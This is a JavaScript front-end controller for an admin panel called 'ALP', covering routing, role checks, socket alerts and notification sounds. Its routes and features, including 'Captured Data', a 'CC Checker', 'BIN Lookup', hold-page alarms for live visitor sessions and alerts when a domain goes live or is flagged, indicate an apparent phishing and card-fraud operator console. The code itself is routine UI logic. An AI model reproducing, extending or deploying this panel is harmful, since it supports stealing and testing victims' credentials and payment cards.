/**
 * ALP - Main Application Controller
 * Handles SPA hash routing, route guards, layouts, socket notification dispatch, and global toasts
 */
const ALPApp = (() => {
  const routes = {
    'dashboard': DashboardPage,
    'sessions': SessionsPage,
    'captured-data': CapturedDataPage,
    'funnel': FunnelPage,
    'demo-pages': DemoPagesPage,
    'analytics': AnalyticsPage,
    'ip-blocking': IPBlockingPage,
    'rate-limits': RateLimitsPage,
    'firewall-rules': FirewallRulesPage,
    'notifications': NotificationsPage,
    'logs': LogsPage,
    'settings': SettingsPage,
    'domains': DomainsPage,
    'vps': VpsPage,
    'user-management': UserManagementPage,
    'bin-lookup': BinLookupPage,
    'cc-checker': CCCheckerPage,
    'login': LoginPage
  };

  let currentPageName = '';
  let currentPageModule = null;

  // --- Router ---

  async function handleRouting() {
    let hash = window.location.hash.trim().substring(2) || 'dashboard';
    
    // Parse query params if any
    const queryIdx = hash.indexOf('?');
    let queryParams = {};
    if (queryIdx !== -1) {
      const queryStr = hash.substring(queryIdx + 1);
      hash = hash.substring(0, queryIdx);
      const urlSearchParams = new URLSearchParams(queryStr);
      queryParams = Object.fromEntries(urlSearchParams.entries());
    }

    const isAuthenticated = window.ALPAuth.isAuthenticated();

    // Route guards
    if (!isAuthenticated && hash !== 'login') {
      window.location.hash = '#/login';
      return;
    }

    if (isAuthenticated && hash === 'login') {
      window.location.hash = '#/dashboard';
      return;
    }

    const pageModule = routes[hash];
    if (!pageModule) {
      window.location.hash = '#/dashboard';
      return;
    }

    // Restricted pages — redirect users without required role to dashboard
    const godOnlyPages = ['funnel', 'user-management'];
    if (godOnlyPages.includes(hash) && !window.ALPAuth.isGod()) {
      window.location.hash = '#/dashboard';
      return;
    }
    const superAdminPages = ['demo-pages'];
    if (superAdminPages.includes(hash) && !window.ALPAuth.isSuperAdmin()) {
      window.location.hash = '#/dashboard';
      return;
    }

    // Per-user page access permissions (set by god admin)
    // Skip for dashboard (fallback landing page) — would create a redirect loop if blocked
    if (isAuthenticated && hash !== 'dashboard' && !window.ALPAuth.isGod() && !window.ALPAuth.canAccess(hash)) {
      window.location.hash = '#/dashboard';
      return;
    }

    currentPageName = hash;

    // Destroy previous page module state
    if (currentPageModule && typeof currentPageModule.destroy === 'function') {
      currentPageModule.destroy();
    }

    currentPageModule = pageModule;

    const loginContainer = document.getElementById('login-container');
    const appLayout = document.getElementById('app-layout');

    if (hash === 'login') {
      // Clear cached sidebar/header so next login re-renders with the correct user
      const _sidebarInner = document.querySelector('#sidebar .sidebar-inner');
      const _pageHeader = document.getElementById('page-header');
      if (_sidebarInner) _sidebarInner.innerHTML = '';
      if (_pageHeader) _pageHeader.innerHTML = '';

      // Show login screen
      appLayout.style.display = 'none';
      loginContainer.style.display = 'block';
      loginContainer.innerHTML = pageModule.render();
      pageModule.init(queryParams);
    } else {
      // Show dashboard shell
      loginContainer.style.display = 'none';
      appLayout.style.display = 'grid';

      // Lazy render sidebar and header once
      const sidebarInner = document.querySelector('#sidebar .sidebar-inner');
      const pageHeader = document.getElementById('page-header');

      if (sidebarInner && !sidebarInner.innerHTML) {
        sidebarInner.innerHTML = window.ALPSidebar.renderSidebar();
        window.ALPSidebar.initSidebar();
      }

      // Friendly page-title map — beats the "capitalize hash" default
      // for routes whose slug doesn't match the display name.
      const PAGE_TITLES = {
        'demo-pages':      'Websites',
        'bin-lookup':      'BIN Lookup',
        'cc-checker':      'CC Checker',
        'ip-blocking':     'IP Blocking',
        'rate-limits':     'Rate Limits',
        'firewall-rules':  'Firewall Rules',
        'captured-data':   'Captured Data',
        'user-management': 'User Management',
        'vps':             'VPS',
      };
      const displayTitle = PAGE_TITLES[hash] || capitalize(hash.replace(/-/g, ' '));

      if (pageHeader && !pageHeader.innerHTML) {
        pageHeader.innerHTML = window.ALPHeader.renderHeader(displayTitle);
        window.ALPHeader.initHeader();
      }

      // Highlight active nav item
      window.ALPSidebar.updateActiveNav(hash);

      // Set page header title
      window.ALPHeader.setTitle(displayTitle);

      // Render the page module inside page-content
      const pageContent = document.getElementById('page-content');
      
      // Page exit transition
      pageContent.classList.add('fade-out');
      
      setTimeout(() => {
        pageContent.innerHTML = pageModule.render();
        pageContent.className = 'page-content fade-in';

        // Signal loading system: data fetch is about to start
        if (window.ALPLoading) window.ALPLoading.pageReady();

        // Initialize page module scripts
        if (typeof pageModule.init === 'function') {
          pageModule.init(queryParams);
        }
      }, 150);

      // Verify connection to sockets
      if (window.ALPSocket && !window.ALPSocket.connected) {
        window.ALPSocket.connect(window.ALPAuth.getToken());
      }
    }
  }

  function capitalize(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
  }

  // --- Real-time Sockets Integration ---

  function initSocketHandlers() {
    if (!window.ALPSocket) return;

    // Live permission-change push from god. Refresh cached perms, redraw the
    // sidebar, and bounce off the current page if it just got revoked.
    window.ALPSocket.on('admin:permissions-changed', async (data) => {
      try {
        const me = await window.ALPApi.getMe();
        if (me?.user && window.ALPAuth?._applyServerPermissions) {
          window.ALPAuth._applyServerPermissions(me.user);
          // Broadcast to pages that hide/disable buttons per canAct(),
          // so they can re-render without listening for the raw socket
          // event (which fires before the /me refresh completes).
          document.dispatchEvent(new CustomEvent('alp:permissions-applied'));
        }
      } catch { /* non-fatal */ }

      if (window.showToast) {
        window.showToast(data?.message || 'Your permissions were updated.', 'warning');
      }

      // Force a sidebar re-render so removed pages disappear immediately.
      const sidebarInner = document.querySelector('#sidebar .sidebar-inner');
      if (sidebarInner && window.ALPSidebar) {
        sidebarInner.innerHTML = window.ALPSidebar.renderSidebar();
        window.ALPSidebar.initSidebar();
        window.ALPSidebar.updateActiveNav(currentPageName);
      }

      // If the current page is now blocked, bounce to dashboard.
      if (currentPageName && !window.ALPAuth.canAccess(currentPageName)) {
        window.location.hash = '#/dashboard';
      }
    });

    window.ALPSocket.on('admin:notification', (notif) => {
      window.showToast(notif.message, notif.type || 'info');

      if (notif.event === 'domain_live') {
        window.playEventSound('domain_live');
      } else if (notif.event === 'domain_flagged') {
        window.playEventSound('domain_flagged');
      } else if (window.playNotificationSound) {
        window.playNotificationSound();
      }

      if (window.ALPNotifications) window.ALPNotifications.refresh();

      if (currentPageName === 'notifications' && currentPageModule && typeof currentPageModule.loadNotifications === 'function') {
        currentPageModule.loadNotifications();
      }
    });

    window.ALPSocket.on('admin:session:update', (sessions) => {
      const holdSetting = window.ALPSettings && window.ALPSettings.hold_sound;
      if (!holdSetting || holdSetting === '0') {
        if (window.holdSoundManager.isPlaying()) window.holdSoundManager.stop();
        return;
      }

      const list = Array.isArray(sessions) ? sessions : [sessions];
      const hasHolding = list.some(s => {
        if (!s.is_active) return false;
        const p = (s.current_page || '').toLowerCase();
        if (window.SessionTemplates && window.SessionTemplates.isLoadingPage) {
          return window.SessionTemplates.isLoadingPage(p, s.current_page_type);
        }
        if (s.current_page_type === 'loading') return true;
        return p.includes('/loading') || p.includes('/wait') || p.includes('/hold') ||
               p.includes('/processing') || p.includes('/verifying') || p.includes('/standby');
      });

      if (hasHolding) {
        if (!window.holdSoundManager.isPlaying()) window.holdSoundManager.start();
      } else {
        if (window.holdSoundManager.isPlaying()) window.holdSoundManager.stop();
      }
    });

    window.ALPSocket.on('admin:session:new', (session) => {
      window.showToast(`New visitor session active from ${session.ip_address || 'Unknown IP'}`, 'success');
      
      // Trigger live sessions page reload or append if active
      if (currentPageName === 'sessions' && currentPageModule && typeof currentPageModule.loadSessions === 'function') {
        currentPageModule.loadSessions();
      }
    });

    window.ALPSocket.on('admin:session:end', (data) => {
      // Trigger live sessions page reload or removal if active
      if (currentPageName === 'sessions' && currentPageModule && typeof currentPageModule.loadSessions === 'function') {
        currentPageModule.loadSessions();
      }
    });
  }

  // --- Global Toasts (Window accessible fallback mapping) ---

  window.showToast = (message, type = 'info', duration) => {
    if (duration === undefined) {
      const settingsSecs = window.ALPSettings && window.ALPSettings.notify_duration;
      const secs = settingsSecs ? parseInt(settingsSecs, 10) : 8;
      duration = secs * 1000;
    }
    
    if (window.ALPToast && typeof window.ALPToast.show === 'function') {
      window.ALPToast.show(message, type, duration);
    } else if (window.ALPToast && typeof window.ALPToast.showToast === 'function') {
      window.ALPToast.showToast(message, type, duration);
    } else {
      console.log(`[Toast ${type}]: ${message}`);
    }
  };

  // --- Global Modals (Window accessible fallback mapping) ---

  window.showModal = (options) => {
    if (window.ALPModal && typeof window.ALPModal.showModal === 'function') {
      return window.ALPModal.showModal(options);
    } else {
      console.warn('ALPModal not loaded. Modal options:', options);
    }
  };

  // --- Global Notification Sounds & Settings Helpers ---

  window.ALPSettings = {};

  window.reloadGlobalSettings = async () => {
    try {
      const data = await window.ALPApi.getSettings();
      window.ALPSettings = data.settings || data || {};
    } catch (e) {
      console.warn('[ALP] Failed to load settings:', e);
    }
  };

  window.playNotificationSound = (overrideSound = null, overrideVolume = null) => {
    // Check if notify_sound is enabled (defaults to '1' if not loaded yet or set to '1')
    const soundSetting = overrideSound !== null 
      ? overrideSound 
      : ((window.ALPSettings && window.ALPSettings.notify_sound) !== undefined 
          ? String(window.ALPSettings.notify_sound) 
          : '1');
    
    if (soundSetting === '0') return;

    // Determine volume multiplier
    const volSetting = overrideVolume !== null
      ? overrideVolume
      : ((window.ALPSettings && window.ALPSettings.notify_volume !== undefined)
          ? Number(window.ALPSettings.notify_volume)
          : 100);
    
    const volMultiplier = Math.max(0, Math.min(100, volSetting)) / 100;
    if (volMultiplier === 0) return;

    try {
      const AudioContextClass = window.AudioContext || window.webkitAudioContext;
      if (!AudioContextClass) return;
      
      const audioCtx = new AudioContextClass();
      
      const playChime = (freq, delay, duration, volume, type = 'sine') => {
        const osc = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();
        
        osc.type = type;
        osc.frequency.setValueAtTime(freq, audioCtx.currentTime + delay);
        
        const finalVol = volume * volMultiplier;
        gainNode.gain.setValueAtTime(finalVol, audioCtx.currentTime + delay);
        gainNode.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + delay + duration);
        
        osc.connect(gainNode);
        gainNode.connect(audioCtx.destination);
        
        osc.start(audioCtx.currentTime + delay);
        osc.stop(audioCtx.currentTime + delay + duration);
      };

      let lastStop = 0;
      if (soundSetting === 'blip') {
        playChime(1200, 0, 0.08, 0.12, 'triangle');
        playChime(1500, 0.05, 0.08, 0.12, 'triangle');
        lastStop = 0.13;
      } else if (soundSetting === 'ping') {
        playChime(1760, 0, 0.8, 0.15, 'sine');
        lastStop = 0.8;
      } else if (soundSetting === 'retro') {
        playChime(523.25, 0, 0.1, 0.1, 'square');
        playChime(659.25, 0.05, 0.1, 0.1, 'square');
        playChime(783.99, 0.1, 0.1, 0.1, 'square');
        playChime(1046.50, 0.15, 0.2, 0.1, 'square');
        lastStop = 0.35;
      } else {
        playChime(783.99, 0, 0.4, 0.15, 'sine');
        playChime(1046.50, 0.08, 0.5, 0.12, 'sine');
        lastStop = 0.58;
      }
      // Close context after oscillators finish to avoid browser context limit
      setTimeout(() => { try { audioCtx.close(); } catch(e) {} }, (lastStop + 0.1) * 1000);
    } catch (err) {
      console.warn('[ALP] Chime playback failed:', err);
    }
  };

  // --- Event-specific sounds ---

  window.playEventSound = (eventType) => {
    const volSetting = (window.ALPSettings && window.ALPSettings.notify_volume !== undefined)
      ? Number(window.ALPSettings.notify_volume) : 100;
    const vol = Math.max(0, Math.min(100, volSetting)) / 100;
    if (vol === 0) return;

    try {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      const ctx = new AC();

      const tone = (freq, delay, dur, gain, type = 'sine') => {
        const osc = ctx.createOscillator();
        const g = ctx.createGain();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, ctx.currentTime + delay);
        g.gain.setValueAtTime(gain * vol, ctx.currentTime + delay);
        g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + delay + dur);
        osc.connect(g); g.connect(ctx.destination);
        osc.start(ctx.currentTime + delay);
        osc.stop(ctx.currentTime + delay + dur);
      };

      let lastStop = 0;
      if (eventType === 'domain_live') {
        tone(523, 0, 0.15, 0.12, 'sine');
        tone(659, 0.12, 0.15, 0.14, 'sine');
        tone(784, 0.24, 0.15, 0.16, 'sine');
        tone(1047, 0.36, 0.4, 0.18, 'sine');
        lastStop = 0.76;
      } else if (eventType === 'domain_flagged') {
        tone(880, 0, 0.12, 0.2, 'square');
        tone(660, 0.14, 0.12, 0.18, 'square');
        tone(440, 0.28, 0.12, 0.16, 'square');
        tone(330, 0.42, 0.3, 0.22, 'sawtooth');
        lastStop = 0.72;
      }

      setTimeout(() => { try { ctx.close(); } catch(e) {} }, (lastStop + 0.2) * 1000);
    } catch (err) {
      console.warn('[ALP] Event sound failed:', err);
    }
  };

  // --- Hold Sound Manager ---
  // Loops a distinct alert sound while any session is on hold; stops when none remain.

  window.holdSoundManager = (() => {
    let _audioCtx = null;
    let _intervalId = null;
    let _isPlaying = false;

    function _ctx() {
      if (!_audioCtx || _audioCtx.state === 'closed') {
        const AC = window.AudioContext || window.webkitAudioContext;
        if (!AC) return null;
        _audioCtx = new AC();
      }
      if (_audioCtx.state === 'suspended') _audioCtx.resume();
      return _audioCtx;
    }

    function _beat(overrideSound, overrideVolume) {
      const snd = overrideSound !== undefined
        ? String(overrideSound)
        : String((window.ALPSettings && window.ALPSettings.hold_sound) || 'pulse');
      if (snd === '0') { if (_isPlaying) stop(); return; }

      const volRaw = overrideVolume !== undefined
        ? Number(overrideVolume)
        : ((window.ALPSettings && window.ALPSettings.hold_volume !== undefined)
            ? Number(window.ALPSettings.hold_volume) : 80);
      const vol = Math.max(0, Math.min(100, volRaw)) / 100;
      if (vol === 0) return;

      const ctx = _ctx();
      if (!ctx) return;

      const tone = (freq, delay, dur, gain, type = 'sine') => {
        const osc = ctx.createOscillator();
        const g = ctx.createGain();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, ctx.currentTime + delay);
        g.gain.setValueAtTime(gain * vol, ctx.currentTime + delay);
        g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + delay + dur);
        osc.connect(g);
        g.connect(ctx.destination);
        osc.start(ctx.currentTime + delay);
        osc.stop(ctx.currentTime + delay + dur);
      };

      try {
        if (snd === 'pulse') {
          tone(880, 0, 0.1, 0.18, 'sine');
          tone(880, 0.16, 0.1, 0.18, 'sine');
        } else if (snd === 'alarm') {
          tone(440, 0, 0.12, 0.15, 'square');
          tone(554, 0.13, 0.12, 0.15, 'square');
          tone(659, 0.26, 0.12, 0.15, 'square');
        } else if (snd === 'heartbeat') {
          tone(80, 0, 0.14, 0.25, 'sine');
          tone(80, 0.22, 0.1, 0.18, 'sine');
        } else if (snd === 'drone') {
          tone(220, 0, 0.45, 0.12, 'sawtooth');
          tone(330, 0.05, 0.4, 0.06, 'sine');
        }
      } catch (e) {
        console.warn('[ALP] Hold sound beat error:', e);
      }
    }

    function start() {
      if (_isPlaying) return;
      const snd = String((window.ALPSettings && window.ALPSettings.hold_sound) || 'pulse');
      if (snd === '0') return;
      _isPlaying = true;
      _beat();
      const ms = snd === 'drone' ? 700 : snd === 'alarm' ? 1500 : snd === 'heartbeat' ? 1700 : 2000;
      _intervalId = setInterval(() => _beat(), ms);
    }

    function stop() {
      if (!_isPlaying) return;
      _isPlaying = false;
      clearInterval(_intervalId);
      _intervalId = null;
      if (_audioCtx) {
        try { _audioCtx.close(); } catch (e) {}
        _audioCtx = null;
      }
    }

    function preview(soundType, volume) {
      _beat(soundType, volume);
    }

    return { start, stop, isPlaying: () => _isPlaying, preview };
  })();

  // --- Bootstrap ---

  async function init() {
    window.addEventListener('hashchange', handleRouting);

    // Refresh permissions from the server so a stale JWT can't beat a fresh
    // god-side change. /me returns { user: { permissions, website_ids, ... } };
    // ALPAuth caches it in sessionStorage and merges it over the JWT payload.
    if (window.ALPAuth?.isAuthenticated?.()) {
      try {
        const me = await window.ALPApi.getMe();
        if (me?.user && window.ALPAuth._applyServerPermissions) {
          window.ALPAuth._applyServerPermissions(me.user);
        }
      } catch { /* non-fatal — fall back to JWT payload */ }
    }

    // Load settings globally so that sound and notification settings work immediately
    await window.reloadGlobalSettings();

    // Setup socket listeners
    initSocketHandlers();

    // Dynamic premium mouse glow effect tracking
    document.addEventListener('mousemove', (e) => {
      const card = e.target.closest('.card, .session-card, .glass-cc-preview, .ip-badge-box, .session-path-box, .redirect-page-btn');
      if (card) {
        const rect = card.getBoundingClientRect();
        card.style.setProperty('--mouse-x', `${(e.clientX - rect.left)}px`);
        card.style.setProperty('--mouse-y', `${(e.clientY - rect.top)}px`);
      }
    });

    // Initial routing
    handleRouting();
  }

  return { init };
})();

// Initialize on page load
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', ALPApp.init);
} else {
  ALPApp.init();
}
